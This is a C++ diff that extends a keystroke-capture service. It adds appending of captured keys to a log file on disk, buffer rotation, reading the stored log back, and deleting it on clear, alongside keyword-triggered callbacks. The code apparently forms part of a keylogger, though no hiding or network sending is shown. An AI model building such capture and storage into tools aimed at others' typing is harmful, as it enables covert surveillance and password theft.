@@ -1,13 +1,20 @@
 #include "domain/services/KeystrokeService.hpp"
 
 #include <algorithm>
+#include <fstream>
 
 namespace nuub::domain::services {
+
+KeystrokeService::KeystrokeService(const std::string& log_path, size_t max_buffer)
+    : log_path_(log_path)
+    , max_buffer_size_(max_buffer)
+    , persistence_enabled_(!log_path.empty())
+{
+}
 
 void KeystrokeService::check_keywords(const std::string& key) {
     if (keywords_.empty() || !keyword_callback_) return;
 
-    // Build current word from buffer
     std::string word;
     for (auto it = buffer_.rbegin(); it != buffer_.rend(); ++it) {
         const auto& k = it->key;
@@ -15,7 +22,6 @@ void KeystrokeService::check_keywords(const std::string& key) {
         word = k + word;
     }
 
-    // Check if any keyword is contained in the current word
     std::string lower_word = word;
     std::transform(lower_word.begin(), lower_word.end(), lower_word.begin(), ::tolower);
 
@@ -29,6 +35,26 @@ void KeystrokeService::check_keywords(const std::string& key) {
     }
 }
 
+void KeystrokeService::flush_to_disk() {
+    if (!persistence_enabled_ || log_path_.empty()) return;
+
+    std::ofstream ofs(log_path_, std::ios::app);
+    if (!ofs.is_open()) return;
+
+    for (const auto& entry : buffer_) {
+        ofs << entry.key;
+    }
+    ofs.flush();
+}
+
+void KeystrokeService::rotate_if_needed() {
+    if (buffer_.size() <= max_buffer_size_) return;
+
+    // Flush current buffer to disk, then clear
+    flush_to_disk();
+    buffer_.clear();
+}
+
 void KeystrokeService::process_press(const std::string& key) {
     if (paused_) return;
     if (key.empty()) return;
@@ -36,6 +62,7 @@ void KeystrokeService::process_press(const std::string& key) {
     std::lock_guard lock(mutex_);
     buffer_.emplace_back(key);
     check_keywords(key);
+    rotate_if_needed();
 }
 
 void KeystrokeService::process_release(const std::string& /*key*/) {
@@ -48,6 +75,17 @@ bool KeystrokeService::is_paused() const { return paused_; }
 std::string KeystrokeService::get_log() {
     std::lock_guard lock(mutex_);
     std::string result;
+
+    // First read from disk (if persistence enabled)
+    if (persistence_enabled_ && !log_path_.empty()) {
+        std::ifstream ifs(log_path_);
+        if (ifs.is_open()) {
+            result.assign(std::istreambuf_iterator<char>(ifs),
+                         std::istreambuf_iterator<char>());
+        }
+    }
+
+    // Then append in-memory buffer
     for (const auto& entry : buffer_) result += entry.key;
     return result;
 }
@@ -55,6 +93,19 @@ std::string KeystrokeService::get_log() {
 std::string KeystrokeService::clear_log() {
     std::lock_guard lock(mutex_);
     std::string result;
+
+    // Read from disk first
+    if (persistence_enabled_ && !log_path_.empty()) {
+        std::ifstream ifs(log_path_);
+        if (ifs.is_open()) {
+            result.assign(std::istreambuf_iterator<char>(ifs),
+                         std::istreambuf_iterator<char>());
+        }
+        // Delete the log file
+        std::remove(log_path_.c_str());
+    }
+
+    // Append in-memory buffer
     for (const auto& entry : buffer_) result += entry.key;
     buffer_.clear();
     return result;
@@ -76,6 +127,17 @@ std::vector<std::string> KeystrokeService::get_keywords() const {
 
 void KeystrokeService::set_keyword_callback(std::function<void(const std::string&)> callback) {
     keyword_callback_ = std::move(callback);
+}
+
+void KeystrokeService::enable_persistence(const std::string& log_path, size_t max_buffer) {
+    std::lock_guard lock(mutex_);
+    log_path_ = log_path;
+    max_buffer_size_ = max_buffer;
+    persistence_enabled_ = !log_path.empty();
+}
+
+size_t KeystrokeService::buffer_size() const {
+    return buffer_.size();
 }
 
 } // namespace nuub::domain::services
